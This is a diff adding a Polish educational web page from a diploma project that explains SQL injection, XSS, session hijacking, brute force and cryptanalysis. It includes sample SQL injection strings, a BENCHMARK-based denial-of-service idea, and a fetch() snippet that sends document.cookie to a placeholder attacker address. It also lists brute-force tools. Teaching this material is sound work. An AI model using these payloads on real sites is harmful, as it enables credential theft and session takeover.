@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="pl-PL">
+<title>Serwis do testowania audytu bezpieczeństwa</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="css.css">
+<script src="script/jquery-3.6.0.js"></script>
+<script>
+	function showHideText(div, btn) {
+  var btnText = document.getElementById(btn);
+  var x = document.getElementById(div);
+  if (x.style.display === "none") {
+    x.style.display = "block";
+    btnText.innerHTML = "Mniej";
+  } else {
+    x.style.display = "none";
+    btnText.innerHTML = "Więcej";
+  }
+}	
+</script>
+<body>
+  <header>
+    <div class="nav">
+      <ul>
+        <li class="home"><a href="#" >Strona Główna</a></li>
+        <li class="serwis"><a href="serwis">Serwis</a></li>
+        <li class="instrukcja"><a href="zadania">Zadania</a></li>
+        <li class="instrukcja"><a href="about.html">O Stronie</a></li>
+      </ul>
+</div>
+
+  </header>
+		<div class="hidenav" onclick="actionNav()">&#9776;</div>	
+		<div class="rightbar"></div>
+		<div class="leftbar"></div>
+		
+		<div id="sidebar" class="sidebar"	style="display: block">
+      <ul>
+        <li style="line-height: normal;"><a href="#SQL" style="padding:10px">SQL</br> Injection</a></li>
+        <li ><a href="#XSS">XSS</a></li>
+        <li style="line-height: normal;"><a href="#SESJA" style="padding:10px">Session hijacking</a></li>
+        <li ><a href="#BRUTE">Brut force</a></li>
+        <li ><a href="#SZYFR">Kryptoanaliza</a></li>
+      </ul>
+	 
+		 </div>
+		 <script src="script/nav.js"></script>
+		<div id="content">
+		<div class="content-mid">
+		<H1>Witaj Przyszły Hakerze!	</H1>
+		<p style="text-indent: 5%; ">Strona ta została stworzona w ramach pracy dyplomowej. Przeglądając treści zawarte na tej stronie, możesz zdobyć wiedzę o różnych podatnościach występujących w cyberprzestrzeni. 
+		</p>
+		<p>Opis zawartych podatności to między innymi: SQL Injection, Cross Site Scripting, Session hijacking.</br>Strona została stworzona w przejrzysty sposób. Wystarczy przejeść w dół strony lub użyć menu. Znajduję się ono z lewej strony, które automatyczne przeniesie Ciebie do odnoszącej się treści. Przycisk "Więcej" ukazuje pozostałą treść, która została ukryta, aby ułatwić przeglądanie strony.
+		</p>
+		<H4>
+		Pamiętaj wszelkie próby wykorzystania w cyberprzestrzeni przedstawionych podatności, gdy nie masz uprawnień do takich działań uznawane są za przestępstwo!!
+		</H4>
+		<p>Dodatkowo jak chcesz sprawdzić swoją wiedzę, stworzyłem serwis (przekierowanie znajduję się w górnym menu wraz z opracowanymi zadaniami do niego). Możesz śmiało testować swoje umiejętności.  </p>
+ </div>
+<div id="SQL" class="content-mid">
+<H1 >SQL Injection </H1>
+  <h4>Czym jest SQL injection?</h4>
+Jest to po prostu wstrzyknięcie w formularzu komunikującym się z bazą danych złośliwego kodu zazwyczaj w formacie SQL. Lukę tą wykorzystuje się w aplikacjach bazodanowych. W wyniku podatności stron na ataki występuje wiele zagrożeń z tym związanych:
+<ol>
+   <li> kradzież danych;</li>
+   <li> logowanie się do serwisu bez znajomości hasła;</li>
+   <li> wstrzymanie usług w serwisie.</li>
+</ol>
+Wykorzystanie tej formy ataku doprowadzać może do sytuacji krytycznych dla serwisu co czyni ją szczególnie niebezpieczną.
+Jeśli chodzi o samą podatność jaką jest wstrzyknięcie kodu podzielono ją na kilka możliwych ataków. Zależne są one najczęściej od zwracanych wartości lub samego zachowania serwisu. Pod tym względem tego typu ataki dzielimy na:
+<ul>
+  <li> Klasyczne wstrzyknięcie kodu;</li>
+  <li> Ślepy atak;</li>
+  <li> Blokada serwera.</li>
+</ul>
+Omawiany atak nie stroni też od wad. Często, nie jest znany silnik bazy danych, z której korzysta serwis, przez co składnia samych zapytań może się różnić. Kolejną wadą jest brak wiedzy o tabelach w bazie atakowanego serwisu, które mogłyby potencjalnie zawierać interesujące informacje dla atakującego. Mimo powyżej opisanych niedogodności wykorzystanie tej podatności jest niebezpieczne dla przechowywanych danych. Możliwości wykorzystania jej na przykład w logowaniu czy blokadzie samego serwera bazy danych, przedstawia dalsza część pracy.
+<div style="display: none;" id="sql-more">
+
+<h4>Klasyczne wstrzyknięcie kodu</h4>
+<p>Klasyczne wstrzyknięcie kodu polega na wykorzystaniu luki w aplikacji, która jest połączona z bazą danych i otrzymaniu informacji, które nie powinny być zwracane przez dany formularz.
+</p>
+<p>Atakujący w przypadku tej podatności, wprowadza do formularza kod, który ma na celu dostać się do innej tabeli lub, odczytać inny rekord. Natomiast sama aplikacja odczytuje wpisaną treść jako formę komunikacji z bazą danych. Skutkuje to wymianą wcześniej utworzonego zapytania na spreparowane w taki sposób aby aplikacja zwróciła informacje, do których odnosi się wstrzyknięty kod. Operację klasycznego wstrzyknięcia kodu przedstawiono na rysunku poniżej. 
+</p>
+<img src="picture/sql_inj.png" width="70%" height="50%">
+
+
+<p>Zwykłym poleceniem <b>{"1'or'1'='1"}</b> wykryto, że przedstawiony formularz jest podatny na różne ataki, gdyż operacja ta zwróciła wszystkie możliwe wiersze. Pozwoliło to na wykorzystanie bardziej zaawansowanego pytania, jako że sam formularz nie odnosił się do tabeli interesującej atakującego wykorzystano polecenie ,,UNION''. Polecenie to pozwala łączyć zbiory z dwóch zapytań w jedną tabelę. Jedno z zapytań jest integralną częścią aplikacji i odnosi się do wiadomości o podanym numerze, natomiast dołożenie własnego zapytania tak jak w tym przypadku <b>" 1' SELECT first\_name, password FROM usr # "</b>. Powoduje, odczytanie 1 numeru wiadomości oraz dodanie tabeli usr z polami first\_name i password. Średnik ma na celu zamknięcie otwartej wartości, która jest oczekiwana w bazowym zapytaniu. Symbol hash natomiast powoduje za komentowanie dalszej części pytania wykorzystywanego przez aplikację, gdyż jest znakiem specjalnym w języku SQL. Dzięki wpisaniu takiej komendy zamiast podania zwykłej cyfry aplikacja odczytuje to jako pełne zapytanie i zwraca zupełnie inne dane. Utworzone zapytanie pozwala na odczytanie nazwy oraz hasła wszystkich użytkowników, zapisanych w bazie danych prowadząc jednocześnie do wycieku danych z serwisu. 
+</p>
+<p>Jedną z wad wynikającą z klasycznego ataku jest fakt że ingerujący z zewnątrz, użytkownik musi znać lub testować rożne kombinacje nazw, które są używane przy tworzeniu bazy i oczekiwać aż aplikacja odpowie pomyślnie. Kolejną wadą takiego ataku jest korzystanie z polecenia ,,UNION''. Tak skonstruowane zapytanie musi zwracać tyle samo pól co tworzone przez aplikację zapytanie wzorcowe. Następnym z problemów atakującego jest konieczność poznania składni konkretnego języka SQL bazy danych z jakiego korzysta aplikacja. Wiadomym jest że pomimo standaryzacji tego języka, każdy serwer bazodanowy ma swoje  indywidualne polecenia. 
+</p>
+<h4>Ślepy atak</h4>
+Drugim z rodzajów ataku typu SQL Injection może być tzw. ślepy atak. Występuje formularz aplikacji, który jest podatny na wstrzyknięcie kodu, ale sama budowa aplikacji nie zwraca  wyników odpowiednich dla danej operacji. Ataki takie są często wykorzystywane podczas logowania na konto użytkownika, bez znajomości jego hasła.
+
+W przypadku wykorzystania ślepego ataku wiele technik z klasycznego wstrzyknięcia kodu, które przedstawione zostało wcześniej, są nieskuteczne. Klasyczne wstrzyknięcie kodu bazuje na zwracanych wynikach z bazy danych aplikacji. Natomiast ślepy atak nie ma na celu uzyskania wartości z ukrytej treści, bo sama budowa aplikacji na to nie pozwala. Jego celem jest na przykład modyfikacja formularza logowania, w taki sposób aby atakujący nie musiał podawać hasła a mimo to aplikacja pomyślnie zaloguje takiego użytkownika, bez weryfikacji pozostałych danych. na rysunku\. przedstawiono wykorzystanie ślepego ataku w formularzu przeznaczonym do logowania się. Przy próbie dostania się na stronę w tym przypadku użytkownik nie musi znać hasła, wystarczy login i odpowiednio zmodyfikowane zapytanie w języku SQL.
+
+ <img src="picture/sql_inj slepy.png" width="70%" height="50%">
+<p>
+Wykorzystanie ślepego ataku w przedstawiony sposób nie zawsze jest możliwe. Zależy to przede wszystkim od utworzonego wcześniej zapytania, do czego ono się odnosi i czy podane wartości w formularzu bezpośrednio odnoszą się do zapytania. W tym przypadku zapytanie jedynie sprawdza czy użytkownik o podanych wartościach istnieje w bazie danych. Podając nazwę użytkownika oraz np. ,,\#'' komentującego dalszą część zapytania w efekcie spowoduje to pominięcie pozostałego zapytania pozwoli na zalogowanie się bez znajomości hasła, wystarczy odpowiednio spreparować zapytanie np.\textbf{,,user' \#''} . Na rysunku wykorzystano polecenie <b>"user' or' 1'='1"</b> co zawsze zwraca pomyślną wartość, dlatego aplikacja z sukcesem wykonała spreparowane zapytanie. W wyniku czego nie było potrzeby podawania hasła w aplikacji. 
+</p>
+<h4>Atak blokady serwera</h4>
+<p>
+Ostatnim z opisywanych rodzajów ataku typu SQL Injection jest blokada serwera. Na wykorzystanie tego typu ataku pozwala podatność serwisu na wstrzyknięcia kodu, w sposób podobny do wcześniej opisywanych form ataku SQL Injection. Głównym celem postawionym przed tym typem ataku jest wstrzymanie usługi bazy danych. Nie ma znaczenia czy serwis zwraca jakąkolwiek wartość przez formularz. Wystarczy, że odpowiednio spreparowane zapytania "przeciążą" połączenie z bazą danych co spowoduje blokadę serwera bazodanowego.
+Przykładem może być wykorzystanie formularza, który przedstawiony jest na rysunku \ref{klasyczny}. 
+Spreparować należy wówczas wartość w formularzu aby dany serwer wykonywał przeciążające go, bezsensowne obliczenia i doprowadzić do wstrzymania usługi. Pożądany efekt końcowy ataku uzyskany zostanie dopiero wówczas, gdy spreparowane zapytanie użyte zostanie w wielu wątkach. Taką operację łatwo wykonać dzięki funkcji ,,BENCHMARK()'', która w SQL sprawdza w jakim czasie wykona się dane zapytanie. Wprowadzony kod w formularzu z funkcją benchmark przedstawiono na rysunku po lewej stronie. Dzięki menedżerowi zadań systemu WINDOWS zauważyć można że to polecenie w znacznym stopniu obciąża jednostkę, co zaprezentowane zostało po prawej stronie rysunku. Wykonanie kilku takich zapytań w tym samym czasie powinno zablokować działanie serwera bazy danych.
+</p>
+<img src="picture/sql benchmark.png" width="70%" height="50%">
+<p>
+Pokazany przykład odnosił się do serwera bazy danych typu SQL w przypadku innych serwerów baz danych przedstawiany tu atak może nie działać, ewentualnie atakujący zmuszony będzie do użycia innej składni odpowiadającej za działanie funkcji ,,BENCHMARK''. Kolejnym problemem jest użytkownik za pośrednictwem, którego następuje połączenie z bazą danych. Często nie posiada on wystarczających uprawnień do wykonywania pożądanych przez atakującego operacji, które wykonywać może np. tylko administrator serwera. 
+To jedna z dość częstych i jednocześnie niebezpiecznych podatności w aplikacjach webowych (oraz niewebowych). Nie bez powodu SQL injection należy do pierwszej (A1) z dziesięciu kategorii błędów  wymienianych w dokumencie OWASP Top Ten.
+ </div></p>
+<button onclick="showHideText('sql-more','btn-sql')" class="read-more-btn" id="btn-sql" >Więcej</button>
+
+</div>
+
+ 
+	<div id="XSS" class="content-mid">
+<H1 >Cross Site Scripting </H1>
+  <h4>Czym jest XSS</h4><p>
+  Cross-Site Scripting w skrócie XSS jest to jeden z ataków na serwis, który jest bardzo podobny do wcześniej przedstawionego ataku, SQL Injection, bowiem wywodzi on się przecież z tej samej rodziny ataków typu Inject. Jego działanie polega na~wstrzyknięciu w treści danej strony złośliwego kodu najczęściej w formacie Java Script. Taka operacja może doprowadzić do wykonania różnych niechcianych akcji, zdefiniowanych we wstrzykniętym skrypcie.
+
+Podatność serwisu na tego typu ataki wykorzystywana jest najczęściej w phishingu lub do kradzieży ciasteczek. Nie jest to jednak jedyna możliwość wykorzystania tego typu ataku. Oprogramowanie Java Script użyte w formularzu działa po stronie użytkownika. W związku z powyższym skrypty są jawnie udostępniane. W takich przypadkach atakujący może opracować skrypt kontrolujący wprowadzane wartości w formularzu. Przez tak zmieniony skrypt serwis nie otrzyma spodziewanych wartości, ze względu na modyfikację walidacji przez atakującego. Działanie to jest możliwe głównie wtedy, gdy aplikacja obsługująca serwis, ma niewystarczające sprawdzanie poprawności wprowadzanych danych po stronie serwera i niedostatecznie kontroluje wpisywane wartości przez użytkowników.
+
+Jeśli chodzi o samą podatność jaką jest XSS rozróżniamy kilka form wykorzystania tego typu ataków:
+<ul>
+  <li> Składowane XSS. </li>
+  <li> Odbite XSS. </li>
+  <li> Oparte na DOM XSS. </li>
+</ul>
+<p>
+Podatność na tego typu ataki jest bardzo poważną luką w zabezpieczeniach aplikacji internetowej. W tego typu przypadkach atakujący może zdobyć ciasteczka użytkowników przechowujących jego sesje. Atakującemu umożliwi to korzystanie ze zdobytej sesji użytkownika. Rozdział 2.4, wyjaśnia dokładniej znaczenie sesji użytkowania.
+</p><p>
+<code>
+fetch('adres strony atakujacego', {</br>
+method: '',</br>
+body:document.cookie </br>
+});</code></p>
+<p>
+Przedstawione ataki opierają się na wykryciu tych podatności, dlatego działanie opisano głównie za pośrednictwem funkcji ,,alert''. Wyświetla ona na stronie w komunikacie podaną wartość w argumencie, kod przedstawiający użycie tej funkcji przedstawia listing. Jest to najłatwiejszy sposób, aby sprawdzić czy dany formularz jest podatny na wprowadzony złośliwy kod. Zastosowanie opisanego w punkcie kodu umożliwić może wykradnięcie ciasteczek, dzięki czemu atakujący w prosty sposób zdobędzie sesję użytkownika z atakowanej witryny.
+</p></p><p>
+<code>
+alert("Wyswietlana wiadomosc.");</code></p>
+
+<div style="display: none; transition: .25s ease;" id="xss-more">
+
+<h4>Składowane XSS</h4>
+<p>W tym rozdziale opisany zostanie atak XSS składowany. Polega on na zapisaniu w bazie danych utworzonego przez atakującego skryptu, który zostaje wczytany przez innych użytkowników serwisu. Spowoduje to wykonanie przez ich przeglądarki operacji utworzonych przez atakującego.</p>
+<p>Atak tego typu jest najgroźniejszą formą ataku XSS, ponieważ atakujący nie musi tworzyć adresów czy zmuszać ofiary do wejścia na spreparowany adres. </p>
+<p>Wystarczy, wykorzystać zależności, która zapisuje informacje i wyświetla je innym użytkownikom danej witryny. Poważne zagrożenie działania takich ataków wynika z faktu, że spreparowana wiadomość może wyświetlić się u każdej osoby odwiedzającej stronę przez co, taki atak działa na dużą skalę zależną od ilości użytkowników odwiedzających witrynę. Wykrycie opisywanej podatności za pomocą najprostszego skryptu wywołującego alert przedstawia rysunek 
+</p>
+<img src="picture/xss3.png" width="70%" height="50%">
+
+
+<h4>Odbite XSS</h4>
+<p>
+Kolejną formą ataku XSS jest tzw. odbity atak. Występuje najczęściej w serwisach, które pobierają i wyświetlają daną zawartość. Najczęstsze miejsca występowania podatności na ten typ ataku to serwisy, które wykorzystują formularz tekstowy, wysyłany do odczytania na stronie. Atakujący najczęściej przesyła link z gotowym skryptem a nieświadomy niczego użytkownik wykonuje skrypt atakującego. Efektem powyższego jest realizacja poleceń ze skryptu, który dzięki linkowi został fałszywie podstawiony. Wykrycie takiej podatności przedstawia rysunek
+</p>
+<img src="picture/xss2.png" width="70%" height="50%">
+
+<h4>DOM XSS</h4>
+<p>
+Trzecią z opisywanych form ataku XSS jest atak typu DOM opierający się na Obiektowym Modelu Dokumentów. Jest on bardzo podobny do ataku odbitego czyli sfałszowany przez atakującego, kod przekazywany jest przez spreparowany adres URL. Metoda opisywana w tym rozdziale różni się od poprzednio opisywanych. Atak opisywany w poprzednim rozdziale opierał się na wprowadzeniu przez atakującego swojego kodu w formularzu do tego przeznaczonym. Realizacja tego typu ataku jest trudniejsza, gdyż formularz jest inny najczęściej jest to lista wyboru przez co nie ma możliwości w prosty sposób wpisania swojej wartości. Ze względu na to że serwisy z tego typy formularzami działają najczęściej w oparciu o metodę HTTP-GET. Daje to możliwość wprowadzenia swojego kodu w miejscu argumentu ww. metody. Wystarczy podać odpowiednio podmienione wartości w adresie URL strony. Sposób wykrycia takiej podatności przedstawia rysunek.
+<img src="picture/xss.png" width="70%" height="50%">
+</p>
+<p>Obostrzenia w dostępie są szczególnie istotne w przypadku ciasteczek, które bardzo często wykorzystywane są do utrwalenia uwierzytelnienia. Jeśli kod napastnika znajdzie się w treści atakowanego serwisu, posiądzie nie tylko możliwość zmodyfikowania wyglądu tej strony, ale również pozyskania i przesłania (patrz XMLHTTP) innym potencjalnie istotnych danych. Gdyby ten sam kod został umieszczony na innej stronie, przeglądarka ofiary odmówiłaby mu dostępu do zasobów związanych z atakowaną witryną. </p>
+ </div>
+<button onclick="showHideText('xss-more','btn-xss')" class="read-more-btn" id="btn-xss">Więcej</button>
+</div>
+
+ 
+<div id="SESJA" class="content-mid">
+<H1 >Hakowanie Sesji </H1>
+<p>Atak session haijacking ma miejsce wtedy, gdy atakujący przejmuje sesję użytkownika. Atak opiera się na kradzieży ciasteczek lub identyfikatora sesji, w zależności od założeń samego serwisu. Może być on jawnie przekazywany w adresie URL. Sam atak polega na przechwyceniu sesji użytkownika najczęściej za pośrednictwem wcześniej opisywanego ataku XSS. Metoda na kradzież ciasteczek pokazana jest w listingu.</p>
+<p> Innym sposobem kradzieży jest wykorzystanie różnych metod kryptograficznych, które ,,zgadują'' ciągłość znaków rozpoznających unikalny identyfikator sesji. Zazwyczaj wykorzystuje się do tego atak ,,Brute force''. Metoda taka ma sens wtedy, gdy dany identyfikator ma mało znaków szczególnych i różnice pomiędzy znakami w identyfikatorach pomiędzy sesjami są niewielkie. Po uzyskaniu wykradzionego identyfikatora atakujący może przeglądać daną stronę internetową jako użytkownik, do którego należał ten właśnie identyfikator. Oznacza to, że może korzystać ze wszystkich danych jakie zostały zapisane przez tego użytkownika. Atak taki może doprowadzić do wycieku danych. Wyciek danych może nastąpić wówczas, gdy atakujący pozyska konto administratora posiadającego w opisywanym portalu dużo większe uprawnienia w porównaniu do podstawowych użytkowników.
+</p>
+<div style="display: none;" id="sesja-more">
+<h4>Przechwytywanie sesji </h4>
+<img src="picture/session.png" width="70%" height="50%">
+<p>
+Rysunek przedstawia dwie różne sesje, ich identyfikatory posiadają zbyt mało różnic dzięki czemu jest on podatny na atak siłowy. Atakujący zaobserwuje, że dany identyfikator  wygenerowany został w prosty sposób, dzięki czemu możliwy będzie atak na daną aplikację. Zbyt małe różnice w znakach mogą doprowadzić do kradzieży informacji użytkownika przez podmianę jego identyfikatora. Jest kilka sposobów aby bronic się przed takimi ataki. Obrona polega na:
+</p>
+<ol>
+    <li> tworzenie sesji o znacznych różnicach w identyfikatorach, przez co trudny będzie do przeprowadzenia opisanego ataku;</li>
+    <li> innym ważnym aspektem jest przechowywanie czasu w sesji i prośba o zniszczenie sesji użytkownika po jej upływie;</li>	
+    <li> kolejną metodą ochrony danej sesji jest przechowywanie adresu z jakiego logował się użytkownik i w przypadku kiedy adresy nie zgadzają się sesja powinna zostać zniszczona.</li>
+</ol>
+</div>
+
+<button onclick="showHideText('sesja-more','btn-sesja')" class="read-more-btn" id="btn-sesja">Więcej</button>
+</div>
+
+ 
+<div id="BRUTE" class="content-mid">
+<H1 >Brute force </H1>
+<p> Atak ,Brute force'' jest to prosta metoda pozwalająca w teorii na odgadnięcie każdego klucza lub hasła. Sam atak ma jednak dużo czynników, które powodują znaczną zależność od szybkości czy możliwości znalezienia odpowiedniej wartości. 
+</p>
+<p>Podatność na tego typu ataki na stronach internetowych występuje najczęściej w formularzu logowania. Atak ,,Brute force'' polega na zezwoleniu atakującemu na wprowadzanie nieskończonej ilości razy własnych danych w tym formularzu. Szybkość zdobycia dostępu do atakowanego konta zależy w głównej mierze od polityki danej firmy a w związku z tym:
+</p>
+<ol>
+    <li>  jaki stopień skomplikowania haseł przewiduje w aplikacji;</li>
+    <li> jak bardzo są one rozbudowane;</li>
+    <li> jak szybko serwer odpowiada na próbę logowania. </li>
+</ol>
+
+<div style="display: none;" id="brute-more">
+<h4>Zabezpieczenie aplikacji</h4>
+W celu zabezpieczenia serwisu przed takimi atakami należy blokować adres, który wykonywał wielokrotną próbę logowania. Przy wielokrotnej próbie logowania można również ograniczyć przepustowość połączenia z logującym się. Ostateczną metodą jest blokada atakowanego konta w celu zabezpieczenia go przed atakującym.  
+<p>
+Przy atakach typu brute force, którego celem jest zalogowanie się na atakowane konto używa się baz haseł. Baza taka zawiera najczęściej stosowane hasła przez użytkowników, co znacząco ułatwia zdobycie go do takiego konta przez atakującego. Jak pokazują statystyki najpopularniejszym hasłem użytkownika jest ,,123456''.
+dane bazują na statystykach znajdujących się pod adresem: <a href="https://nordpass.com/most-common-passwords-list/">https://nordpass.com/most-common-passwords-list/</a>
+</p>
+<ol>
+    <li> Gobuster;</li>
+    <li> BruteX;</li>
+    <li> Dirsearch;</li>
+    <li> Callow;</li>
+    <li> SSB;</li>
+    <li> Thc-Hydra;</li>
+    <li> Burp Suite;</li>
+    <li>Patator.</li>
+</ol>
+</br>
+Poniżej przedstawiono wykorzystanie aplikacji Burp Suite. W celu przeprowadzenia ataku na stronę.</br>
+<img src="picture/burp_web.png" width="50%" height="70%">
+</div>
+
+<button onclick="showHideText('brute-more','btn-brute')" class="read-more-btn" id="btn-brute">Więcej</button>
+</div>
+
+<div id="SZYFR" class="content-mid">
+
+<H1>Analiza Szyfru </H1>
+  <p>Analiza jakiegoś szyfry to po prostu badanie zaszyfrowanej wiadomości, w celu jej odszyfrowania. Osoba zajmująca się zadaniem analizy stara się wszystkimi możliwymi sposobami rozszyfrować wiadomość. Często jednak różne wiadomości są kilkakrotnie szyfrowane, przez co taka analiza jest bardzo trudna do wykonania. </P>
+  <p> Osoba zajmująca się tym działem musi być bardzo sprytna i zorganizowana, gdyż musi rozpoznać z jakiego szyfru korzystają, przy szyfrowaniu danego tekstu. Z pomocą przychodzą różne programy, które ułatwiają znacznie taką pracę.
+  </p>
+  <div style="display: none;" id="szyfr-more">
+<h4>Zastosowania</h4>
+<p>
+Celem szyfru jest utajnienie wiadomości, każdy szyfr kiedyś był nie do rozszyfrowania. Jednak z czasem rozwój pozwalał na deszyfrację, trzeba zwrócić uwagę, że nie zawsze użycie prostych szyfrowań ma sens. Im ważniejsze dane to czas i pieniądze poświęcone na szyfrowanie powinny być równoważne do niego, a nawet większe. Przechodząc do tematyki analizy, jest kilka metod analizy:
+<ul>
+ <li>Metoda Brute force, która sprawdza wszystkie możliwe szyfry, które zostały w niej zawarte i sprawdza, czy wiadomość po wykonaniu takiej operacji jest zwracana poprawnie.
+ </li>
+ <li>Kryptoanaliza różnicowa jej celem jest porównanie wiadomości, które szyfrowane są za pomocą kluczy. W tej analizie porównuje się dwie wiadomości, które zaszyfrowane zostały tym samym kluczem.
+ </li>
+<li> Kryptoanaliza statystyczna jest to analizowanie występowania poszczególnych liter w danych szyfrach. Obecnie praktycznie nieużywana, gdyż wiele szyfrów, jest odporna na analizę tą metodą.
+</li>
+</ul>
+Istnieją też już napisane programy przez inne osoby, które znacznie ułatwiają przeprowadzenie analizy szyfrów, poniżej wymieniona część z nich:
+	<ol>
+	<li>Cryptool</li>
+	<li>EverCrack</li>
+	<li>AlphaPeeler</li>
+	<li>Ganzúa</li>
+	</ol>
+Oprócz wżej wymienionych istnieją też aplikacje dostępne online, które pozwalają na proste analizy.</p>
+</div>
+<button onclick="showHideText('szyfr-more','btn-szyfr')" class="read-more-btn" id="btn-szyfr">Więcej</button>
+</div>
+</body>
+
+</html>
+
+<?php
+//if (file_exists('/db_action/start.php')) {
+    // Jeśli istnieje, zrób include
+//print("sas");
+
+    include('db_action/start.php');
+?>
